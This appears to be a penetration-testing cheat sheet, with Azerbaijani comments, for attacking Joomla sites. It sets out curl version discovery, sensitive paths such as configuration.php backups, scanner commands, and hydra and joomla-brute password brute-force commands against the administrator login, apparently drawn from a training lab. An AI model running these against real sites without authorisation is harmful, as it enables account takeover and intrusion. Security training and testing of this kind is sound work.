# Discovery
```powershell
curl -s http://dev.inlanefreight.local/ | grep Joomla

curl -s https://target.com/robots.txt
# Tipik Joomla robots.txt
# Disallow: /administrator/
# Disallow: /cache/
# Disallow: /tmp/

curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format

curl -s https://target.com/administrator/manifests/files/joomla.xml | grep "<version>"
```

# Main Tabs
```powershell
# Admin panel
https://target.com/administrator/

# Login səhifəsi
https://target.com/administrator/index.php

# API (Joomla 4.x+)
https://target.com/api/index.php/v1/

# Config backup (olduqda həssas)
https://target.com/configuration.php
https://target.com/configuration.php.bak
https://target.com/configuration.php~

# Cache
https://target.com/cache/
https://target.com/tmp/
```

# Droopescan
```powershell
sudo pip3 install droopescan

droopescan scan joomla --url http://dev.inlanefreight.local/
```

# JoomlaScan
```powershell
python2 -m pip install bs4

python2 joomlascan.py -u http://dev.inlanefreight.local

sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

# JoomlaScan
```powershell
sudo apt install joomscan

joomscan --url https://target.com

joomscan --url https://target.com \
         --enumerate-components \
         --random-agent \
         --proxy 127.0.0.1:8080

# Komponent siyahısı
joomscan --url https://target.com -ec

# Output fayla yaz
joomscan --url https://target.com \
         --output report.txt
```

# BruteForce
```powershell
# HTTP POST form brute force
hydra -l admin -P rockyou.txt target.com \
      http-post-form \
      "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid"

# User listindən
hydra -L users.txt -P passwords.txt target.com \
      http-post-form \
      "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid"
```
